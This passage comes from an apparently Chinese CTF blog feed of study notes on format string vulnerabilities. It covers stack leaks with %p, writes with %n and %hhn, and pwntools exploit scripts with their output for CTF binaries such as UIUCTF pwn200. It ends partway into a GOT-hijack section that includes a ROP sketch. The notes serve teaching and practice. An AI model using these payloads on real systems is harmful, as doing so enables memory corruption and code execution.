&quot;%08x.%08x.%08x&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开始泄露位置</span></span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;%08x.%08x.%08x&quot;</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot;   ← $eax</span><br><span class="line">0xffffcd14│+0x18: &quot;.%08x.%08x&quot;</span><br><span class="line">0xffffcd18│+0x1c: &quot;x.%08x&quot;</span><br></pre></td></tr></table></figure><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>上面已经实现依次获取栈中的每个参数，通过像下面这样构造，直接获取指定为位置的参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 第n个参数</span></span><br><span class="line"><span class="meta">%</span><span class="bash">n<span class="variable">$p</span></span></span><br></pre></td></tr></table></figure><p>只要知道目标数据在栈上的偏移 n ，就能够获取。</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><h4 id="会用来泄露什么"><a href="#会用来泄露什么" class="headerlink" title="会用来泄露什么"></a>会用来泄露什么</h4><p>理论上任何栈上数据都能被泄露出来，目前遇到过的有以下这些：</p><ul><li><p>Canary</p><p>泄露出 Canary 的值，从而绕过 Canary 保护。</p></li><li><p>text 段地址</p><p>泄露出 text 段的真实地址，从而绕过 PIE 对于 text 段的保护，为 ROP 实现提供基础。</p></li><li><p>libc 函数地址</p><p>泄露 libc 函数地址，获取 libc base addr 。这里也可以用来是绕过 PIE 保护，但泄露 libc 地址意义不止于此。</p></li><li><p>某些变量</p><p>有些题目会有 if 判断输入值等是否与预先设定的值相等，以此增加难度。</p></li></ul><h4 id="关键字选择"><a href="#关键字选择" class="headerlink" title="关键字选择"></a>关键字选择</h4><ol><li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li><li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li><li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li></ol><h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>覆盖内存使用的 <code>%n</code>和 <code>%c</code> 配合实现。</p><ul><li><p>c</p><p>简单点来说就是产生几个 null 字符。</p></li><li><p>n</p><p>不输出字符，但将成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>写入的时候也有多种方式：</p><ul><li>n：int</li><li>hn：short int 写入双字节</li><li>hhn：char int 写入单字节</li></ul></li></ul><p>给出如下的程序来介绍相应的部分（32位）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="覆盖任意地址"><a href="#覆盖任意地址" class="headerlink" title="覆盖任意地址"></a>覆盖任意地址</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>这里以将 a 覆盖为 2 为例。需要将覆盖的目标地址后置，因为机器字长为 4 （64 位是 8）。</p><p>构造字符串如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa%k$nxx[addr]</span><br></pre></td></tr></table></figure><p><code>aa</code> 两个可见字符，所以最后会向目标地址写入 2 。<code>k</code> 目标地址的偏移位置。<code>xx</code> 让字符串对其机器字长，这里是 4 。<code>[addr]</code> 覆盖的目标地址。</p><h5 id="怎么对齐"><a href="#怎么对齐" class="headerlink" title="怎么对齐"></a>怎么对齐</h5><p>对齐方法在 32 64 程序中，覆盖大数字、小数字中都通用，以上面这个为例。python 使用 len 计算长度后，用机器字长取余，余数就是对齐长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位机器字长：4</span></span><br><span class="line"><span class="comment"># 64位机器字长：8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">&quot;aa%k$n&quot;</span>)%<span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>第一个可控字符偏移是 6 ，<code>aa%k$nxx</code> 长度为 8 （不会算就 python len），所以 k 偏移应该是 8 。</p><p>构造覆盖小数字利用代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fora</span>():</span></span><br><span class="line">    sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">    a_addr = <span class="number">0x0804A024</span></span><br><span class="line">    payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure><p>对应的结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;python exploit.py</span><br><span class="line">0xffc1729c</span><br><span class="line">aaaa$\xa0\x0modified a for a small number.</span><br></pre></td></tr></table></figure><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>覆盖基本结构和上面差不多，区别是通常是覆盖大数字会分次覆盖，避免一下数据太大而不成功，所以会用到标志 <code>hhn</code> 或 <code>hn</code> 。</p><p>还是使用上面例题，写入的目标地址为 0x0804A028 。使用单字节写入（hhn），写入值为 <code>0x12345678</code> 。变量是小端序存储，也在内存中是这样的：<code>\x78\x56\x34\x12</code> ，简单点就是从右向左覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804A028 \x78</span><br><span class="line">0x0804A029 \x56</span><br><span class="line">0x0804A02a \x34</span><br><span class="line">0x0804A02b \x12</span><br></pre></td></tr></table></figure><p>为了与覆盖小数字统一，避免计算地址占用字长，将地址放置在字符串末尾，得出以下框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式化字符串</span></span><br><span class="line">payload=<span class="string">&quot;%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn&quot;</span></span><br><span class="line"><span class="comment"># 目标地址</span></span><br><span class="line">payload += p32(<span class="number">0x0804A028</span>)+p32(<span class="number">0x0804A028</span>+<span class="number">1</span>)+p32(<span class="number">0x0804A028</span>+<span class="number">2</span>)+p32(<span class="number">0x0804A028</span>+<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><code>x</code> 控制输出多少个 null 字符。<code>y</code> 写入地址的偏移量。</p><h5 id="手工计算-c-生成字符数"><a href="#手工计算-c-生成字符数" class="headerlink" title="手工计算 c 生成字符数"></a>手工计算 c 生成字符数</h5><p>写入顺序为：0x78、0x56、0x34、0x12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">需要写入0x78，已经存储0x0字符</span><br><span class="line">0x78&#x3D;120</span><br><span class="line">x1&#x3D;120</span><br><span class="line">---</span><br><span class="line">需要写入0x56，已经存储0x78字符</span><br><span class="line">0x156溢出单字节上限，忽略进位，存储0x56</span><br><span class="line">0x156-0x78&#x3D;222</span><br><span class="line">x2&#x3D;222</span><br><span class="line">---</span><br><span class="line">需要写入0x34，已经存储0x156字符</span><br><span class="line">0x234溢出单字节上限，忽略进位，存储0x34</span><br><span class="line">0x234-0x156&#x3D;222</span><br><span class="line">x3&#x3D;222</span><br><span class="line">---</span><br><span class="line">需要写入0x12，已经存储0x234字符</span><br><span class="line">0x312溢出单字节上限，忽略进位，存储0x12</span><br><span class="line">0x312-0x234&#x3D;222</span><br><span class="line">x4&#x3D;222</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>得到结果：<code>payload=&quot;%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn&quot;</code> ，长度是 44 ，预估地址偏移是两位数字，再进行一下修改，计算对齐长度为 0 ，最后 payload 为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn&quot;</span><br><span class="line">payload +&#x3D; p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)</span><br></pre></td></tr></table></figure><h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><h4 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h4><p>覆盖那里内容都好，覆盖地址肯定要明确的，覆盖栈上变量也是需要的。变量地址一般会存放在栈上，我们就需要找到栈存放这个变量地址的偏移。</p><h4 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h4><p>调试在 printf 打断点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">────[ stack ]────</span><br><span class="line">[&#39;0xffffcd0c&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp</span><br><span class="line">0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;</span><br><span class="line">0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315</span><br><span class="line">0xffffcd18│+0x0c: 0x000000c2</span><br><span class="line">0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10</span><br><span class="line">0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000</span><br><span class="line">0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH&#x3D;&#x2F;org&#x2F;freedesktop&#x2F;DisplayManager&#x2F;Seat[...]&quot;</span><br><span class="line">0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax</span><br></pre></td></tr></table></figure><p>在 0xffffcd14 处存储着变量 c 的地址。偏移量为 6 。</p><h4 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h4><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[addr of c]%012d%6$n</span><br></pre></td></tr></table></figure><p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p>具体脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def forc():</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)</span><br><span class="line">    c_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16)</span><br><span class="line">    print hex(c_addr)</span><br><span class="line">    payload &#x3D; p32(c_addr) + &#39;%012d&#39; + &#39;%6$n&#39;</span><br><span class="line">    print payload</span><br><span class="line">    #gdb.attach(sh)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    print sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">forc()</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  overwrite git:(master) ✗ python exploit.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;overwrite&#39;: pid 74806</span><br><span class="line">0xfffd8cdc</span><br><span class="line">܌��%012d%6$n</span><br><span class="line">܌��-00000160648modified c.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞基础例子</title>
      <link href="archives/91d59204/"/>
      <url>archives/91d59204/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞基础例子"><a href="#格式化字符串漏洞基础例子" class="headerlink" title="格式化字符串漏洞基础例子"></a>格式化字符串漏洞基础例子</h1><blockquote><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？<strong>虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</strong></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="确定保护"><a href="#确定保护" class="headerlink" title="确定保护"></a>确定保护</h4><p>这里，我们以 2017 年的 UIUCTF 中 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看出程序开启了 Canary、NX 保护以及部分 RELRO 保护。</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>可以发现，程序的漏洞很明显</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">21</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">    v5 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v5 || v11[j] != v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(format);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">        fflush(_bss_start);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> 中的 fmtarg 来判断某个参数的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  fmtarg 0x00007fffffffdb28</span><br><span class="line">The index of format argument : 10</span><br></pre></td></tr></table></figure><p>需要注意的是我们必须 break 在 printf 处。</p><blockquote><p>来自 resery 师傅注解：</p><p>这里的 10 是由 5+5 得到的，至于为什么是这两个 5 是从哪里的得到的，我来解释一下，前面的 5：由于 64 为程序，前 64 个参数是存在寄存器中的，分别是 rdi，rsi，rcx，rdx，r8，r9，所以第一个格式化字符串是存储在 rdi 中的，所以 flag 对应的偏移就应该是 5+flag 在栈中的偏移，在栈中的偏移就很好理解了就是 5，所以 flag 对应的格式化字符串偏移为 10</p></blockquote><p><strong>注解</strong></p><ol><li><p>我安装的 Pwndbg 并没有 fmtarg  ，可能是版本不对，如果需要安装一下 gef 插件。</p></li><li><p>两个作者都解释了偏移 10 是怎么计算来，但我更喜欢的方法是<strong>输入一长串 %p 得出输入字符串的偏移是多少，然后再计算目标偏移或地址</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./goodluck</span> </span><br><span class="line">what&#x27;s the flag</span><br><span class="line"><span class="meta">bbbbbbbb%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p</span></span><br><span class="line">You answered:</span><br><span class="line">bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161</span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure><p>0x602830 是第 7 位。为什么泄露的不是 0x6262626262626262 ？前面提到了，64 位系统的前六个参数是寄存器传参的，而 bbbbbbbb 是第一个参数自然在寄存器中存放，0x602830 就是存储的寄存器地址。怎么获得这个地址？gdb 调试断点打在 printf 函数：</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_0.png" alt="fmrstr_0"></p><p>这样得出最后的 flag 偏移为 10 。</p></li></ol><h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 这个库没有用到可以注释掉</span></span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.sniperoj.cn&#x27;</span>, <span class="number">30017</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的（延迟绑定技术）。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。（因为这类函数会在程序源码中使用到，所以能直接或间接从 elf 文件中读取）</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>写入函数：write 函数（常见）</li><li>格式化字符串任意地址写（常见）</li><li>ROP</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset &#x3D; system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] &#x3D; [printf@got] + addr_offset</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 2016 CCTF 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a> 为例进行介绍。</p><h4 id="确定保护-1"><a href="#确定保护-1" class="headerlink" title="确定保护"></a>确定保护</h4><p>如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出程序主要开启了 NX 保护。RELRO 是部分保护，这种状态下可以修改 GOT 表，如果是 FULL 则不行。另外我们一般默认远程都是开启 ASLR 保护的。</p><h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+1Ch] [bp-FCh]@5</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [sp+E4h] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+10Ch] [bp-Ch]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enter the file name you want to get:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%40s&quot;</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s1, <span class="string">&quot;flag&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too young, too simple&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="keyword">char</span> *)file_head; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">60</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(i, &amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;dest, i + <span class="number">0x28</span>);<span class="comment">//将内容复制到dest</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);<span class="comment">//输出dest内容</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p><ul><li>绕过密码</li><li>确定格式化字符串参数偏移</li><li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li><li>修改 puts@got 的内容为 system 的地址。</li><li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li></ul><h4 id="漏洞利用程序"><a href="#漏洞利用程序" class="headerlink" title="漏洞利用程序"></a>漏洞利用程序</h4><p>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 